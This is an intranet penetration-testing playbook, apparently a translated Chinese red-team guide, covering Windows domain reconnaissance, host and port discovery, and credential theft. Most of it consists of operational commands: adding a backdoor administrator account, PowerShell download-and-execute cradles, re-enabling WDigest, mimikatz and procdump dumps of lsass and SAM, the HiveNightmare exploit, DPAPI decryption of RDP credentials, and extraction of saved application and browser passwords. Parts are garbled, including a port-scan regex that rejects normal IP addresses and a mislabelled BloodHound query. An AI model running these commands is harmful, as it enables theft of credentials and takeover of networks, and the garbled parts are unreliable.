# 内网信息搜集

# 本机基础信息搜集

```powershell
# 查看当前用户、权限
whoami /all

# 查看网络配置信息
ipconfig /all

# 查看主机路由信息
route print

# 查看操作系统信息
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # 查看操作系统及版本
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本" # 查看操作系统及版本

# 查看端口连接信息
netstat -ano

# 查看当前会话列表
net session

# 查看当前网络共享信息
net share

# 查看已连接的共享网络
net use

# 查看当前进程信息
tasklist
tasklist /svc # 用于杀软识别
wmic process get Name, ProcessId, ExecutablePath # 通过WMIC查询主机进程信息, 并过滤出进程路径、名称和PID
wmic process where Name="msdtc.exe" get ExecutablePath # 查看指定进程的路径信息

# 查看当前服务信息
wmic service get Caption, Name, PathName, StartName, State # 查看当前所有服务的信息, 并过滤出服务的名称、路径、创建时间、运行状态信息
wmic service where Name="backdoor" get Caption, PathName, State # 查看指定服务的信息, 并过滤出服务的名称、路径和运行状态

# 查看计划任务信息
schtasks /query /v /fo list

# 查看自启程序信息
wmic startup get Caption, Command, Location, User

# 查看系统补丁安装信息
wmic qfe get Caption, CSName, Description, HotFixID, InstalledOn

# 查看应用安装信息
wmic product get Caption, Version

# 查看本地用户/组信息
net user
net user <username>
net localgroup administrators
net user <username> <password> /add # 创建本地用户
net localgroup administrators <username> /add # 将用户加入本地管理员组

# 查看当前登录用户
query user
```

# 域内基础信息搜集

```powershell
# 判断是否存在域环境
net config workstation

# 查看域用户信息
net user /domain
net user <username> /domain # 查看指定域用户的详细信息
wmic useraccount get Caption, Domain, Description # 获取所有用户的SID、所属域和用户描述信息

# 查看域用户组信息
net group /domain
net group "Domain Admins" /domain # 查看域管理组
net group "Domain Computers" /domain # 查看域成员主机组
net group "Domain Controllers" /domain # 查看域控制器组
net group "Domain Guests" /domain # 查看域来宾组
net group "Domain Users" /domain # 查看域用户组
net group "Enterprise Admins" /domain # 查看企业系统管理员组, 适用于域林范围

# 查看域内密码策略
net accounts /domain

# 查看域控制器列表
net group "Domain Controllers" /domain
nltest /DCLIST:shentou.com # 通过nltest命令查询指定域内的域控制器主机列表

# 查看主域控制器
net time /domain # 域环境中, 主域控制器会同时被用作时间服务器

# 定位域控制器
# 知道目标主机的主机名后, 可直接对主机名执行Ping命令, 根据执行返回结果来获取目标主机在内网中的IP地址
# 域控制器在域内往往会被用于DNS服务器, 可以通过寻找DNS服务器地址来定位域控

# 查看域信任关系
nltest /domain_trusts # 域信任关系用于多域环境中的跨域资源的共享
```

# 内网资源探测

## 发现内网存活主机

### 基于ICMP协议发现存活主机

`ICMP`（`Internet Control Message Protocol`，因特网控制消息协议）是`TCP/IP`协议簇的一个子协议，用于网络层通信（`IP主机`和`路由`之间传递控制消息），提供可能发生在通信环境中的各种问题反馈。通过这些信息管理员可以对发生的问题做出诊断，然后采取对应的解决措施。

在实际利用中，可以通过`ICMP`循环对整个网段中的每个`IP`地址执行`Ping`命令，所有能`Ping`通的`IP`地址即为内网中存活的主机。

注意，由于`ICMP`协议属于网络层协议，而在内网穿透时一般采用`TCP`代理，`TCP`协议属于传输层（`OSI`七层模型的位置），也就是说`TCP`是在`ICMP`之上的，所以挂`TCP`代理时并不能代理`Ping`发出`ICMP`协议数据包。

```powershell
for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr "TTL="
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled.png)

### 基于NetBIOS（网络基本输入/输出系统）协议发现存活主机

`NetBIOS`并不是一种网络协议，而是一种应用程序接口，提供`OSI/RM`的会话层（在`TCP/IP`模型中包含在应用层中）服务，让不同的计算机上运行的不同程序可以在局域网中互相连接和共享数据。

几乎所有局域网都是在`NetBIOS`协议的基础上工作的，操作系统可以利用`WINS`服务、广播、`Lmhost`文件等模式将`NetBIOS`名解析为相应的`IP`地址。`NetBIOS`的工作流程就是正常的主机名解析、查询、应答的过程。在`Windows`中，默认在安装`TCP/IP`之后会自动安装`NetBIOS`。

在实际利用中，向局域网的每个`IP`地址发送`NetBIOS`状态查询，可以获得主机名、`MAC`地址等信息。利用工具下载地址：[https://github.com/lifenjoiner/nbtscan](https://github.com/lifenjoiner/nbtscan)。

```powershell
nbtscan.exe 10.10.10.0/24
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%201.png)

### 基于UDP协议发现存活主机

`UDP`（`User Datagram Protocol`，用户数据报协议）是一种用于传输层的无连接传输的协议，为应用程序提供一种不需建立连接就可以发送封装的`IP`数据包的方法。

在实际利用中，可以将一个空的`UDP`报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，`UDP`探测就马上得到一个`ICMP`端口无法到达的回应报文，这意味着该主机正在运行。如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应。利用工具下载：[https://sourceforge.net/projects/osace/files/latest/download](https://sourceforge.net/projects/osace/files/latest/download)。

```powershell
unicornscan -mU 10.10.10.0/24
```

### 基于ARP协议发现存活主机

`ARP`（`Address Resolution Protocol`，地址解析协议）是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议，用于网络层通信。主机发送信息时，将包含目标地址的`ARP`请求通过广播发送给局域网上的所有主机，并等待应答接收返回信息，以此确定目标的物理位置。

在实际利用中，可以向网络发送一个`ARP`请求，若目标主机处于存活状态，则其一定会回应一个`ARP`响应，否则不会做出任何回应。利用工具下载：[https://github.com/QbsuranAlang/arp-scan-windows
-](https://github.com/QbsuranAlang/arp-scan-windows-).

```powershell
arp-scan.exe -t 10.10.10.0/24
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%202.png)

Or use PowerShell script: [https://raw.githubusercontent.com/sinmygit/git/master/Invoke-ARPScan.ps1](https://raw.githubusercontent.com/sinmygit/git/master/Invoke-ARPScan.ps1).

```powershell
set-ExecutionPolicy RemoteSigned
Import-Module .\Invoke-ARPScan.ps1
Invoke-ARPScan -CIDR 10.10.10.0/24

powershell.exe -exec bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 10.10.10.0/24"
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%203.png)

### Discovering a surviving host based on SMB (Server Message Block) protocol

`SMB`, also known as the `Common Internet File System`, `CIFS`, is an application-layer transmission protocol. Its main function is to enable machines on the network to share computer files, printers, serial ports, and communication resources. CIFS messages are generally sent using `NetBIOS` or `TCP`, using ports `139` and `445` respectively, and currently tend to use `445` ports.

In actual use, the SMB service present in the local area network can be detected, thereby discovering the surviving hosts of the intranet, which are mostly suitable for the discovery of `Windows` hosts. Download the tool using: [https://github.com/maaaaz/CrackMapExecWin](https://github.com/maaaaz/CrackMapExecWin).

```powershell
crackmapexec.exe 10.10.10.0/24
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%204.png)

## Intranet port scanning

### Use Telnet to detect ports

```powershell
telnet <IP> <PORT>
```

### Use Nmap for port scanning

```powershell
nmap -p <PORT> <IP>
nmap -sS -p 1-65535 <IP>
nmap -sC -sV -p <PORT> <IP>
```

### Use PowerShell to scan ports

```powershell
powershell.exe -exec bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 10.10.10.0 -EndAddress 10.10.10.254 -ResolveHost -ScanPort"
 
powershell.exe -exec bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 10.10.10.0 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 80,88,135,139,443,445,3306,3389,8080"
```

```powershell
function Invoke-PortScan {
<#
.SYNOPSIS
Nihsang payload which Scan IP-Addresses, Ports and HostNames

.DESCRIPTION
Scan for IP-Addresses, HostNames and open Ports in your Network.
    
.PARAMETER StartAddress
StartAddress Range

.PARAMETER EndAddress
EndAddress Range

.PARAMETER ResolveHost
Resolve HostName

.PARAMETER ScanPort
Perform a PortScan

.PARAMETER Ports
Ports That should be scanned, default values ​​are: 21,22,23,53,69,71,80,98,110,139,111,
389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,
5801,5900,5555,5901

.PARAMETER TimeOut
Time (in MilliSeconds) before TimeOut, Default set to 100

.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254

.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost

.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort
Use above to do a port scan on default ports.

.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500

.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
https://github.com/samratashok/nishang
    
.NOTES
Goude 2012, TrueSec
#>
    [CmdletBinding()] Param(
        [parameter(Mandatory = $true, Position = 0)]
        [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
        [string]
        $StartAddress,

        [parameter(Mandatory = $true, Position = 1)]
        [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
        [string]
        $EndAddress,
        
        [switch]
        $ResolveHost,

        [switch]
        $ScanPort,

        [int[]]
        $Ports = @(21,22,23,53,69,71,80,98,110,139,111,389,443,445,1
080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901),
        
        [int]
        $TimeOut = 100
    )
    Begin {
    $ping = New-Object System.Net.Networkinformation.Ping
    }
    Process {
    foreach($a in ($StartAddress.Split(".")[0]..$EndAddress.Split(".")[0])) {
        foreach($b in ($StartAddress.Split(".")[1]..$EndAddress.Split(".")[1])) {
        foreach($c in ($StartAddress.Split(".")[2]..$EndAddress.Split(".")[2])) {
            foreach($d in ($StartAddress.Split(".")[3]..$EndAddress.Split(".")[3])) {
            write-progress -activity PingSweep -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100)
            $pingStatus = $ping.Send("$a.$b.$c.$d",$TimeOut)
            if($pingStatus.Status -eq "Success") {
                if($ResolveHost) {
                write-progress -activity ResolveHost -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100) -Id 1
                $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null, $null)
                }
                if($ScanPort) {
                $openPorts = @()
                for($i = 1; $i -le $ports.Count;$i++) {
                    $port = $Ports[($i-1)]
                    write-progress -activity PortScan -status "$a.$b.$c.$d" -percentcomplete (($i/($Ports.Count)) * 100) -Id 2
                    $client = New-Object System.Net.Sockets.TcpClient
                    $beginConnect = $client.BeginConnect($pingStatus.Address,$port,$null,$null)
                    if($client.Connected) {
                    $openPorts += $port
                    } else {
                    # Wait
                    Start-Sleep -Milli $TimeOut
                    if($client.Connected) {
                        $openPorts += $port
                    }
                    }
                    $client.Close()
                }
                }
                if($ResolveHost) {
                $hostName = ([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName
                }
                # Return Object
                New-Object PSObject -Property @{
                IPAddress = "$a.$b.$c.$d";
                HostName = $hostName;
                Ports = $openPorts
                } | Select-Object IPAddress, HostName, Ports
            }
            }
        }
        }
    }
    }
    End {
    }
}
```

## Use MetaSploit to detect the intranet

`MetaSploite` has built-in integration with many intranet host survival and detection intranet services. These post-penetration scanning function modules for scanning the target host port are placed in `auxiliary/scanner`. If you want to find a scan module for a certain service, you can search for `auxiliary/scanner/service name`

```powershell
msfconsole
search auxiliary/scanner
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%205.png)

## Get port Banner information

### Use NetCat to get port Banner

```powershell
nc -nv <IP> <PORT>
```

### Use Telnet to obtain port Banner

```powershell
telnet <IP> <PORT>
```

### Use Nmap to get port Banner

```powershell
nmap --script=banner -p <Ports> <IP>
```

# User credential collection

During intranet penetration, after obtaining control of a certain machine, the tester will use the captured host as a springboard to move horizontally, further expanding the scope of resources they have. In lateral penetration, many attack methods require first obtaining the password or hash value of the user in the domain, such as hash delivery attacks, ticket delivery attacks, etc. Therefore, when collecting information, you should collect login credentials and other information of users in the domain as much as possible.

## Get the single password and hash value in the domain

In `Windows`, the `SAM` file is the account database of the `Windows` user, which is located in the `%SystemRoot%\System32\Config` directory of the system. All local users' usernames, password hash values ​​and other information are stored in this file. When the user enters the password to log in, the plain text password entered by the user will be converted to a hash value, and then compared with the hash value in the `SAM` file. If it is consistent, the authentication will be successful. Under normal circumstances, after the user enters his password to log in, the logged-in domain name, user name, login credentials and other information will be stored in the process space of `lsass.exe`. After the user's plaintext password is called by the `WDigest` and `Tspkg` modules, it will be encrypted using a reversible algorithm and stored in memory.

Most of the tools used to obtain the host's user password and hash value are implemented by reading the `SAM` file or accessing the memory data of the `lsass.exe` process. Most of these operations require administrator rights, which means that in the real environment, some privilege escalation operations are often required.

As mentioned above, when a user logs in, the user's plaintext password will be called through the `WDigest` and `Tspkg` modules and then encrypted and stored in the `lsass.exe` memory. However, in order to prevent the user's plaintext password from leaking in memory, Microsoft released the `KB2871997` patch in May 2014, turning off the `WDigest` function and prohibiting the reading of the plaintext password from memory. The `Windows Server 2012` and above versions turn off the `WDigest` function by default, and can restart the `WDigest` function by modifying the registry.

```powershell
# Enable WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 
# Close WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD
/d 0 /f

# Check whether it is enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```

### Read lsas process memory online

Upload `mimikatz.exe` to the target host and execute the following command:

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
# privilege::debug upgrade to DebugPrivilege permission
# sekurlsa::logonpasswords export user credentials
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%206.png)

### Read lsas memory files offline

The method is to first dump the process memory of `lsass.exe`, export the memory file locally, and use `mimikatz` for offline reading. There are many tools for dumping process memory, such as `OutMinidump.ps1`, `ProcDump` (it is Microsoft's software, which has Microsoft's signature certificate and will not be intercepted by the killing software), `SharpDump`, etc. Download the tool using: [https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump).

Upload `procdump.exe` to the target host and execute the following command:

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Then use `mimikatz.exe` to obtain the dumped process memory information and execute the following command:

```powershell
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" exit
# sekurlsa::minidump lsass.dmp is used to load memory files
# sekurlsa::logonpasswords export user credentials
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%207.png)

### Read local SAM files online

Read the user login credentials saved in the `SAM` file and export the hash values ​​of all local users in the current system.

Upload `mimikatz.exe` to the target host and execute the following command:

```powershell
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
# privilege::debug upgrade to DebugPrivilege permission
# token::elevate to SYSTEM permissions
# lsadump::sam is used to read local SAM files
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%208.png)

### Read local SAM files offline

Offline reading means exporting the `SAM` file, using `mimikatz` to load and read the user login credentials and other information. It should be noted that in order to improve the security of the `SAM` file to prevent offline cracking, Windows will encrypt the `SAM` file using a secret key, which is stored in the `SYSTEM` file and is located in the same directory as `SAM`.

First, export the `SAM` and `SYSTEM` files on the target host. Since these two files are locked when the system is running, it needs to be implemented with some tools, and there are several implementation methods:

- Use the Invoke-NinjaCopy.ps1 script provided in the PowerSploit project, download address: [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1).

```powershell
Import-Module ./Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SAM' -LocalDestination 'C:\Users\Administrator\Desktop\SAM'
Invoke-NinjaCopy -Path 'C:\Windows\System32\config\SYSTEM' -LocalDestination 'C:\Users\Administrator\Desktop\SYSTEM'
```

- Using the `HiveNightmare` privilege escalation vulnerability (`CVE-2021-36934`), you can directly read the `SAM` and `SYSTEM` files. The utilization condition is to create a system restore point, and the impact range is all versions released since `Windwos10 Version 1809`, including `Windows11`. Tool download address: [https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe](https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe). Tool download address: [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

```powershell
# Execute HiveNightmare.exe directly and export to generate three files SAM, SYSTEM, and SECURITY in the current directory.
./HiveNightmare.exe
# Run Impacket's secretsdump.py to export the hash value in the SAM file
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

- Execute the command under administrator privileges and export it by saving the registry

```powershell
reg save HKEY_LOCAL_MACHINE\SAM\SAM sam.hive # Export SAM registry
reg save HKEY_LOCAL_MACHINE\SYSTEM system.hive # Export SYSTEM registry
 
mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" exit # Use mimikatz to read the content of SAM file
```

## Get common application credentials

### Get RDP saved credentials

The credentials for the `RDP`remote desktop connection are stored in the `Windows` credential manager in the `%USERPROFILE%\AppData\Local\Microsoft\Credentials` path.

Execute the following command to view all connection credentials saved on the current host:

```powershell
cmdkey /list # View the currently saved credentials
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\* # Traverse the historical connection credential data saved in the Credentials directory
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%209.png)

Use `mimikatz` to export the specified `RDP` connection credentials and execute the following command:

```powershell
mimikatz.exe "privilege::debug" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D" exit # Use mimikatz to parse the specified connection credentials, pbData is the encrypted data of the credentials, guidMasterKey is the GUID of the credentials, and record the value of guidMasterKey
 
mimikatz.exe "privilege::debug" "sek
urlsa::dpapi" exit # Find the MasterKey associated with guidMasterKey(GUID), which is the key used to encrypt the credentials
 
mimikatz.exe "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D/masterkey:a5587e7ce36a2ba6d7df33402d4ddcfaaa96fcbd7eb5fe37aafdd3ca0d24e2c62069be8bcce6075240f538fe060f74902d1ef2b2a99612185a4eeb923a2330dc" exit # Use the found MasterKey to crack the specified credential file DFBE70A7E5CC19A398EBF1B96859CE5D to obtain RDP clear diploma
```

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%2010.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%2011.png)

### Get the credentials saved by Xshell

`Xshell` will save the server connection information in the `.xsh` file in the `Session` directory. If the user checks "Remember username/password" when connecting, the file will save the username and encrypted password for the remote server connection.

```powershell
# Xshell 5
%USERPROFILE%\Documents\NetSarang\XShell\Sessions
# Xshell 6
%USERPROFILE%\Documents\NetSarang Computer\6\XShell\Sessions
# Xshell 7
%USERPROFILE%\Documents\NetSarang Computer\7\XShell\Sessions
```

Versions before Xshell 7 can be decrypted directly through the `SharpDecryptPwd` tool. In addition, the tool can also decrypt `Navicate`, `TeamViewer`, `FileZilla`, `WinSCP`, and `Xmanager` series products. Tool download address: [https://github.com/RowTeam/SharpDecryptPwd](https://github.com/RowTeam/SharpDecryptPwd).

```powershell
# Get the account and password of Xshell 5
SharpDecryptPwd.exe -Xmanager -p "%USERPROFILE%\Documents\NetSarang\Xshell\Sessions"
# Get the account and password of Xshell 6
SharpDecryptPwd.exe -Xmangager -p "%USERPROFILE%\Documents\NetSarang Computers\6\Xshell\Sessions"
```

For versions after Xshell 7, the username and password are no longer stored in the `Session` directory, and you can only use the asterisk password viewer to view the password directly. Tool download address: [https://www.xitongzhijia.net/soft/27250.html](https://www.xitongzhijia.net/soft/27250.html).

### Get the credentials saved by FileZilla

`FileZilla` is used for `FTP` connection. It will save the FTP login credentials in the `%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml` file. You can use the `SharpDecryptPwd` tool mentioned above to export the `FileZilla` saved `FTP` login credentials in one click.

```powershell
SharpDecryptPwd.exe -FileZilla
```

### Get the credentials saved by NaviCat

`NaviCat` is a powerful database management and design tool. `NaviCat` will save the relevant information filled in when connecting to the database to the registry. The specific path is as follows. Note that the password is saved after being encrypted by a reversible algorithm, and the `NaviCat≤11` version and the `NaviCat≥12` version respectively use different encryption algorithms.

```powershell
# Mysql
HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Server\<Connetion Name>
# MariaDB
HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\<Connetion Name>
#MongoDB
HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\<Connetion Name>
# SQL SERVER
HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\<Connetion Name>
# Oracle
HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\<Connetion Name>
# PostgreSQL
HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\<Connetion Name>
# SQLite
HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\<Connetion Name>
```

You can also use the `SharpDecryptPwd` tool mentioned above to export the login credentials for all data that the user has connected to on the current host saved by `NaviCat` in one click.

### Get the login credentials saved by the browser

`HackBrowserData` is an export tool for browser data (password|history|`Cookie`|bookmark|credit card|download history|`localStorage`|browser plug-in) that supports mainstream browsers across the platform. Upload the tool to the target host and run it directly. After execution, the relevant data will be exported to the `result` directory in the current directory. Tool download address: [https://github.com/moonD4rk/HackBrowserData](https://github.com/moonD4rk/HackBrowserData).

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%2012.png)

# BloodHound Automation Analysis Domain Environment

`BloodHound` is a powerful in-domain environment analysis tool that can reveal and analyze the relationships between objects in the domain environment, and present the relationships between relevant users, user groups, computers and other objects in the domain in a visual way, which facilitates the analysis of the overall situation of the in-domain environment and quickly identify complex attack paths.

## Collect and export data

Use the data collector `SharpHound` provided by `BloodHound` to collect information about the domain environment. When using it, upload `SharpHound.exe` to the target host and execute the command: `SharpHound.exe -c All` or `powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"`, `SharpHound` will automatically collect information such as users, user groups, computers, group policies, domain trust relationships in the domain, and package the collected information into a `ZIP` file marked with a timestamp.

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%2013.png)

## Import data

Import the collected data files into `BloodHound`. After importing, `BloodHound` will perform automated data analysis. After the analysis is completed, enter the `Analysis` module. Different analysis queries can be performed by selecting different query conditions.

![Untitled](%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e8733b02d1614977972a074a690afd8e/Untitled%2014.png)

## Edge Information

The following table shows several common edge types.

| Edge Name | Description |
| --- | --- |
| AdminTo | Indicates that the user is local on the target computer
Administrator |
| MemberOf | Indicates that the subject is a member of a user group |
| HasSession | Indicates that the user has a session on a computer |
| ForceChangePassword | Indicates that the subject can reset the target user's password without knowing the target user's current password |
| AddMembers | Indicates that the principal can add any principal to the target security group |
| CanRDP | Indicates that the principal can log in to the remote desktop of the target computer |
| CanPSRemote | Indicates that the principal can start an interactive session with the target computer through Enter-PSSession |
| ExecuteDCOM | Indicates that the principal can execute code under certain conditions by instantiating a COM object on a remote computer and calling its methods |
| SQLAdmin | Indicates that the user is the SQL administrator of the target computer |
| AllowToDelegte | Indicates that the service of the target computer of the principal has delegation permissions |
| GetChanges, GetChangesAll | The combination of them means that the principal has permission to execute DCSync |
| GernericAll | Indicates that the subject has full control over an object |
| WriteDacl | Indicates that the subject has permission to write DACL to an object |
| Gplink | Indicates the range to which Group Policy connects |
| TrustedBy | Used to track domain trust and map to access directions |

## Data Analysis

The following table is the commonly used query functions and descriptions of the `Analysis` module.

| Query function | Description |
| --- | --- |
| DontReqPreAuth | Find all domain administrators |
| Find Principals with DCSync Rights | Find all principals with DCSync permissions |
| Users with Foreign Domain Group Membership | Users with External Domain Group Membership |
| Groups with Foreign Domain Group Membership | Groups with membership in external domain name groups |
| Map Domain Trusts | Map Domain Trust Relationships |
| Find computers where Domain Users are Local Admin | Find all computers where domain users are local administrators |
| Find Find computers where Domain Users can read LAPS passwords | Find all computers where domain users can read passwords |
| Find Workstations where Domain Users can RDP | Find workstations where domain users can RDP remote desktop |
| Find servers where Domain Users can RDP | Find all servers where domain users can RDP remote desktop |
| Find Dangerous Rights for Domain Users Groups |
| Find Kerberoastable Members of High Value Groups | Find Kerberoastable members of High Value Groups |
| List all Kerberoastable Accounts | List all Kerberoastable users |
| Find Kerberoastable Users with most privileges | Find Kerberoastable users with most privileges |
| Find Domain Admin Logos to non-Domain Controllers | Find logins for all domain administrators who are not domain controllers |
| Find computers with Unsupported operating systems | Find computers that do not support the operating system |
| Find AS-REP Roastable Users (DontReqPreAuth) | Find AS-REP Roastable Users (DontReqPreAuth) |
| Find Shortest Paths to Domain Admins | Identify the shortest path to the domain administrator |
| Shortest Paths to Unconstrained Delegation Systems | Identify the shortest path to an unconstrained delegation system |
| Shortest Paths from Kerberoastable Users | Identify the shortest path to the Kerberoastable user |
| Shortest Paths to Domain Admins from Kerberoastable Users | Identify the shortest path from Kerberoastable user to the domain administrator user |
| Shortest Paths to High Value Targets | Identify the shortest path to high-value targets |
| Shortest Paths from Domain Users to High Value Targets | Identify the shortest path from a user to a high-value target |
| Find All Paths from Domain Users to High Value Targets | Identify all paths from domain users to high-value targets |